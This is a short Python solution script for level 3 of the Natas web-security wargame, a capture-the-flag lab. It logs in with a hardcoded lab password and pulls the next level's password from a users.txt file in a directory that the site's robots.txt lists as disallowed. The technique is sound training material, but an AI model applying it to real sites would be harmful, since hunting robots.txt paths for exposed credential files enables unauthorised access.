import requests
import re

"""
Explanation:
Found a Disallow entry for /s3cr3t/ directory. Checked it out and found a users.txt file that contained the username and password
"""

# Authentication
username = "natas3"
password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"

# URL to users.txt
url = f"http://{username}.natas.labs.overthewire.org/s3cr3t/users.txt"

response = requests.get(url, auth=(username, password))
content = response.text

print(re.findall("natas4:(.*)", content)[0])